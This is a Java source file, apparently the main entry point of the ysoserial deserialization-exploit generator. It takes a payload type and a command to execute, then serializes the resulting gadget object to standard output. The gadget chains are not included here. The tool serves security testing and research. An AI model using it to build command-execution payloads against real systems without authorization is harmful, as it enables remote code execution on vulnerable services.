package ysoserial;

import java.io.PrintStream;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.Collections;
import java.util.Comparator;
import java.util.List;

import ysoserial.payloads.ObjectPayload;
import ysoserial.payloads.ObjectPayload.Utils;
import ysoserial.payloads.annotation.Dependencies;

@SuppressWarnings("rawtypes")
public class GeneratePayload {

	private static final int INTERNAL_ERROR_CODE = 70;
	private static final int USAGE_CODE = 64;
	private static final int EMPTY_PREFIX_NUMBER = 0;
	private static final String EMPTY_PREFIX = "";

	public static void main(final String[] args) {
		if (args.length != 2 && args.length != 4) {
			printUsage();
			System.exit(USAGE_CODE);
		}
		final String payloadType = args[0];
		final String command = args[1];

		final Class<? extends ObjectPayload> payloadClass = Utils.getPayloadClass(payloadType);
		if (payloadClass == null) {
			System.err.println("Invalid payload type '" + payloadType + "'");
			printUsage();
			System.exit(USAGE_CODE);
			return; // make null analysis happy
		}

		int prefixNum = EMPTY_PREFIX_NUMBER;
		String prefix = EMPTY_PREFIX;
		if (args.length == 4) {
			prefixNum = parsePrefixNumber(args[2]);
			prefix = args[3];
		}

		try {
			final ObjectPayload payload = payloadClass.newInstance();
			final Object object = payload.getObject(command);
			PrintStream out = System.out;
			if (prefixNum != EMPTY_PREFIX_NUMBER) {
				Serializer.serializeWithPrefix(object, out, prefixNum, prefix);
			} else {
				Serializer.serialize(object, out);
			}
			ObjectPayload.Utils.releasePayload(payload, object);
		} catch (Throwable e) {
			System.err.println("Error while generating or serializing payload");
			e.printStackTrace();
			System.exit(INTERNAL_ERROR_CODE);
		}
		System.exit(0);
	}

	private static void printUsage() {
		System.err.println("Y SO SERIAL?");
		System.err.println("Usage: java -jar ysoserial-[version]-all.jar [payload type] '[command to execute]'");
		System.err.println("    or java -jar ysoserial-[version]-all.jar [payload type] '[command to execute]' [prefix repeat number] '[prefix]'");
		System.err.println("\tAvailable payload types:");
		final List<Class<? extends ObjectPayload>> payloadClasses =
			new ArrayList<Class<? extends ObjectPayload>>(ObjectPayload.Utils.getPayloadClasses());
		Collections.sort(payloadClasses, new ToStringComparator()); // alphabetize
		for (Class<? extends ObjectPayload> payloadClass : payloadClasses) {
			System.err.println("\t\t" + payloadClass.getSimpleName() + " " + Arrays.asList(Dependencies.Utils.getDependencies(payloadClass)));
		}
		System.err.println("\t[prefix repeat number] and [prefix] are optional params");
		System.err.println("\t[prefix] String will be prepended to the resulting object [prefix repeat number] times.");
	}

	public static class ToStringComparator implements Comparator<Object> {
		public int compare(Object o1, Object o2) { return o1.toString().compareTo(o2.toString()); }
	}

	private static int parsePrefixNumber(String param) {
		try {
			int prefixNum = Integer.parseInt(param);
			return prefixNum;
		} catch (Throwable e) {
			System.err.println("'" + param + "' is not a number");
			printUsage();
			System.exit(USAGE_CODE);
		}
		return EMPTY_PREFIX_NUMBER;
	}
}
